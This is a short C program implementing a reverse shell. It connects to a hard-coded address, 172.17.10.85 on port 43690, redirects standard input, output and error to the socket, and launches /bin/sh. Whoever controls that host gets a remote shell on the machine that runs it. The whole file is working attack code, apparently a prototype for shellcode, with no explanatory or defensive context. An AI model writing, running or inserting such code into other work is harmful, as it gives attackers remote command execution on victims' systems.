#include <sys/socket.h>
#include <netinet/in.h>

int main()
{
	char * shell[2];
	int sock, remote;
	struct sockaddr_in serv_addr;

	serv_addr.sin_family = 2;
	serv_addr.sin_addr.s_addr = 0x550A11AC; // 172.17.10.85 (reversed for little endian)
	serv_addr.sin_port = 0xAAAA;		// 43690

	sock = socket( 2, 1, 0 );
	remote = connect( sock, (struct sockaddr*)&serv_addr, 0x10 );
	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);
	shell[0] = "/bin/sh";
	shell[1] = 0;
	execve( shell[0], 0, 0 );
}
